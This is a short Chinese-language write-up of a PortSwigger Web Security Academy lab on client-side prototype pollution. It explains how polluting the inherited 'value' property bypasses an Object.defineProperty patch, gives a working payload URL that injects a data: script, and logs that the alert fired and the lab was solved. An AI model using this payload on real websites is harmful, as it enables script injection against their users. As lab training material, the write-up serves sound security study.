---
title: "lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis"
links:
  - target: prototype-pollution-family
    relation: evidences
---

# lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis

> evidences: [[prototype-pollution-family]]

- 题面:Client-side prototype pollution via browser APIs(/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)
- 实例:https://0a2300da0452181a807fe4fb002300ec.web-security-academy.net
- 判定目标:绕过 `Object.defineProperty` 补丁触发 `alert(1)`;状态:**solved**

## 面

- source:`deparam.js`(同 lab1);gadget 脚本 `searchLoggerConfigurable.js`:
  ```js
  let config = {params: deparam(...), transport_url: false};
  Object.defineProperty(config, 'transport_url', {configurable:false, writable:false});
  if(config.transport_url){ let s=document.createElement('script'); s.src=config.transport_url; document.body.appendChild(s); }
  ```
- 直接污染 `__proto__[transport_url]` **无效**:`config` 自有只读 `transport_url=false`
  (实测 `({}).transport_url` 已污染但未追加 script)。
- 绕法:browser API `Object.defineProperty` 的**descriptor 对象** `{configurable:false,writable:false}`
  继承自 `Object.prototype`;污染 `value` 会被 descriptor 继承 → 该属性以攻击值定义,
  覆盖掉原来的 `false`。

## 载荷

```
https://<inst>/?__proto__[value]=data:,alert(1)//
```

## 证据

```
browse goto <payload> ; browse eval "({}).transport_url" -> "data:,alert(1)//"(污染成功)
lab_alert <payload> --settle-ms 2500 -> {"fired":true,"alerts":["alert:1"]}
solved_check <inst> -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 备注

- 概念见章节 `prototype-pollution/client-side/browser-apis`:凡接受 options/descriptor 对象
  的 browser API 都会读原型链上未定义属性(`fetch` 的 headers、`defineProperty` 的 value 等)。
- 定位时先 `browse eval searchLogger.toString()` 确认部署代码,再判补丁绕法,省瞎试。
